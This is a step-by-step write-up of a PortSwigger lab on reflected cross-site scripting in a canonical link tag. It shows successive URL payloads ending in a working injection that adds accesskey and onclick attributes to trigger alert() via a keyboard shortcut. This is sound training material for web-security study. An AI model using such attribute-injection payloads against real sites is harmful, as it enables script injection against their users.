<h1 align="center"> Lab: Reflected XSS in canonical link tag </h1>

<img width="1000" height="665" alt="image" src="https://github.com/user-attachments/assets/d6ebe626-5c29-458f-8293-67cd0bb5fa17" />


## LAb URL: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag


## LAb Slutions
This lab reflects user input in a canonical link tag and escapes angle brackets.

To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the `alert` function.

To assist with your exploit, you can assume that the simulated user will press the following key combinations: 

````
ALT+SHIFT+X
CTRL+ALT+X
Alt+X
````
 Please note that the intended solution to this lab is only possible in Chrome. 




# Lab Solution:

<img width="1000" height="665" alt="image" src="https://github.com/user-attachments/assets/d6ebe626-5c29-458f-8293-67cd0bb5fa17" />

- Access Lab:
<img width="1176" height="956" alt="image" src="https://github.com/user-attachments/assets/8389e988-1ce5-492d-af68-f7a46647b75f" />

- After I want to injection something like, I add `helo` into URL:
````
https://0ae9008903001388808c85040016004f.web-security-academy.net/Helo
````
<img width="1014" height="105" alt="image" src="https://github.com/user-attachments/assets/fc2dd9cf-8d71-42dd-8727-05832de94317" />

- But I see `Not found`:
<img width="1316" height="218" alt="image" src="https://github.com/user-attachments/assets/36628591-e00b-4179-bbb1-8f165014fd86" />


- And then I add `?Helo`:
````
https://0ae9008903001388808c85040016004f.web-security-academy.net/?Helo
````
<img width="1016" height="116" alt="image" src="https://github.com/user-attachments/assets/db65b391-219f-41ec-820d-dd647a2753c2" />

- And we see nothing alert:
<img width="1448" height="1021" alt="image" src="https://github.com/user-attachments/assets/79b9eeac-9e6c-444d-9cc4-c489d533f6a4" />


- After I want to view source -> `Right-Click` -> `View Page Source`:
<img width="837" height="791" alt="image" src="https://github.com/user-attachments/assets/536d36d7-d288-42ba-9eff-a29e8cb4be89" />

- In this we see what we Inject, also we see it include `'`.

- After I add `'` to our URL:
````
https://0ae9008903001388808c85040016004f.web-security-academy.net/?'Helo
````
<img width="1012" height="110" alt="image" src="https://github.com/user-attachments/assets/8e1165c1-0a5d-42a0-8d72-90d244e93ab2" />

- Note we see what we was Inject:
<img width="1898" height="713" alt="image" src="https://github.com/user-attachments/assets/acf6cd61-2da7-4921-a3b8-9242617e1c37" />


- After I add more `=a`:
````
https://0ae9008903001388808c85040016004f.web-security-academy.net/?'Helo
````
<img width="1019" height="112" alt="image" src="https://github.com/user-attachments/assets/c89c5ed0-c47a-44fb-92dc-2587d3d00f4c" />

- Or in source:
````
view-source:https://0ae9008903001388808c85040016004f.web-security-academy.net/?Helo=a
````
<img width="1877" height="726" alt="image" src="https://github.com/user-attachments/assets/da07d623-f67c-4397-b73a-c2823775b379" />


- Now we see it has different.

- After I try others Inject and add some `onclick=alert()`:
````
view-source:https://0ae9008903001388808c85040016004f.web-security-academy.net/?Helo=a%20onclick=alert()
````
<img width="1911" height="540" alt="image" src="https://github.com/user-attachments/assets/f5cb4ebb-5867-44b8-8791-d8902d8f85f7" />

- Now we see `a%20onclick=alert()'/` is the value of `Helo`>

- After I add `'`:
````
view-source:https://0ae9008903001388808c85040016004f.web-security-academy.net/?Helo='a onclick=alert()
````
<img width="1018" height="107" alt="image" src="https://github.com/user-attachments/assets/48cf5f13-b681-4d28-8c48-40d5e752264b" />

- OR

````
view-source:https://0ae9008903001388808c85040016004f.web-security-academy.net/?Helo=%27a%20onclick=alert()
````
<img width="1905" height="562" alt="image" src="https://github.com/user-attachments/assets/6dce1ff3-9dd6-4d8f-9db1-574775013efb" />



- After I add more `'`:
````
view-source:https://0ae9008903001388808c85040016004f.web-security-academy.net/?Helo='a 'onclick=alert()
````
<img width="1017" height="111" alt="image" src="https://github.com/user-attachments/assets/61271f39-b95d-4215-b8a6-d223c8bfa0b4" />

- OR we can use inlcude encode:
````
view-source:https://0ae9008903001388808c85040016004f.web-security-academy.net/?Helo=%27a%20%27onclick=alert()
````
<img width="1898" height="558" alt="image" src="https://github.com/user-attachments/assets/928d3469-891b-4dc5-a8b2-67388cbcceac" />


- After I add one `'` near `Helo`:
````
view-source:https://0ae9008903001388808c85040016004f.web-security-academy.net/?'Helo='a'onclick=alert()
````
<img width="1027" height="154" alt="image" src="https://github.com/user-attachments/assets/c93a9038-8e77-45a8-9a55-f8373fb2e7af" />

- OR
````
view-source:https://0ae9008903001388808c85040016004f.web-security-academy.net/?%27Helo=%27a%27onclick=alert()
````
<img width="1906" height="558" alt="image" src="https://github.com/user-attachments/assets/243a5f46-b256-4f9f-9d24-d85151b55532" />



- After copy about our payload `?'Helo='a'onclick=alert()`.

- And then back to our target -> PAst our payload:
````
https://0ae9008903001388808c85040016004f.web-security-academy.net/?'Helo='a'onclick=alert()
````
<img width="1020" height="191" alt="image" src="https://github.com/user-attachments/assets/62e8baca-ebb5-4f18-a970-1065472bf05c" />

- After press `Enter`:
<img width="1483" height="1023" alt="image" src="https://github.com/user-attachments/assets/8169332d-b210-47ec-8087-f7cc4ac93abd" />

- But we see nothing alet().

- After go to our first lab -> And then look for `shortcut`:
<img width="772" height="630" alt="image" src="https://github.com/user-attachments/assets/31f63746-7dc0-42ae-9a45-5763b54a6427" />



- And then in this i want to see detail about this shortcut in HTML -> Go to our browser and then type `access jey in html`:
<img width="957" height="796" alt="image" src="https://github.com/user-attachments/assets/001b81cb-327b-46be-a84d-a68f1b3a0760" />

- Or go to direct link: https://www.w3schools.com/tags/att_global_accesskey.asp
<img width="1476" height="1017" alt="image" src="https://github.com/user-attachments/assets/aa41738f-1d44-4d3a-a06d-70d5a3f6d065" />

- After i click on `Try it yourself `:
<img width="1666" height="482" alt="image" src="https://github.com/user-attachments/assets/99187436-3ed3-4395-a8c5-6b2cb4b901aa" />

- Now we see shortcut key to exit. And in this it mean the shortcut has different on and browser like have `chrome`, `mozilla` or `Firefox`.


- After go back to our `Source PAge`:
<img width="1907" height="563" alt="image" src="https://github.com/user-attachments/assets/2952bb69-701e-438e-88ac-3e9ea30abf07" />

- And then in this we need to add one more `'` before `alert()`:
````
view-source:https://0ae9008903001388808c85040016004f.web-security-academy.net/?'Helo='a'onclick='alert()
````
<img width="1010" height="114" alt="image" src="https://github.com/user-attachments/assets/0bddfa71-3847-4958-af5a-ba014b59ca78" />

- Now we see:
<img width="1332" height="237" alt="image" src="https://github.com/user-attachments/assets/6ffbc04d-8c4a-4096-941d-2b5eca4ee60e" />

- After copy this payload `?'Helo='a'onclick='alert()`

- And then go back to our Target -> Past this payload to our target:
<img width="1023" height="181" alt="image" src="https://github.com/user-attachments/assets/7be42b19-8031-4311-a6af-69be0a198dae" />

- After I press `Enter`:
<img width="1443" height="946" alt="image" src="https://github.com/user-attachments/assets/ceae88e1-ebfc-474c-8a5e-723efa05e42f" />

- But I still see nothing in this.

- After press our shortcut key, but in this we choose kae combination `a`, so our short cut key:
````
Alt + Shift + a
````
<img width="1181" height="892" alt="image" src="https://github.com/user-attachments/assets/b091c674-a3d4-41cd-b294-af490fabdcf6" />

But I still see nothing  `Alert`:

- And then in this I change my payload to:
````
https://0ae9008903001388808c85040016004f.web-security-academy.net/?'accesskey='a'onclick='alert()
````
<img width="1015" height="116" alt="image" src="https://github.com/user-attachments/assets/5fca4779-753a-49b2-a618-b637f26594f7" />

- After press `Enter` i see this:
<img width="1320" height="959" alt="image" src="https://github.com/user-attachments/assets/ec9d1429-fc33-4dc9-b0a9-9feb9cd7539f" />

- After Press our shortcut key again:
````
Alt + Shift + a
````
<img width="1423" height="946" alt="image" src="https://github.com/user-attachments/assets/0cafc91f-720b-4008-ab16-abfed05ac402" />

- We succeed.

- But in this it not show we success to solve this lab, cause in this we don't following the lab. So in this i input payload following lab:
````
https://0ae9008903001388808c85040016004f.web-security-academy.net/?'accesskey='x'onclick='alert()
````
<img width="1020" height="110" alt="image" src="https://github.com/user-attachments/assets/7bda6640-9885-47d9-b809-dcb38f220906" />

- After press `Enter`:
<img width="1464" height="837" alt="image" src="https://github.com/user-attachments/assets/6a61c320-4275-4e90-a10f-f9ca84ab6faa" />

- Now we got success to solve this lab.

- IF i test to press shortcut key again it will alert:
````
Alt + Shift + x
````
<img width="1550" height="810" alt="image" src="https://github.com/user-attachments/assets/169c2f25-b615-4130-9c25-8df3ddb10e20" />

- Now we succeed to solve this lab.

----


<h2 align="center"> Finished Of Reflected XSS in canonical link tag </h2>


<h2 align="center"> Author: Nin Kanong (k4n0ng) </h2>

<h3 align="center"> Date: 9/12/2025 </h3>
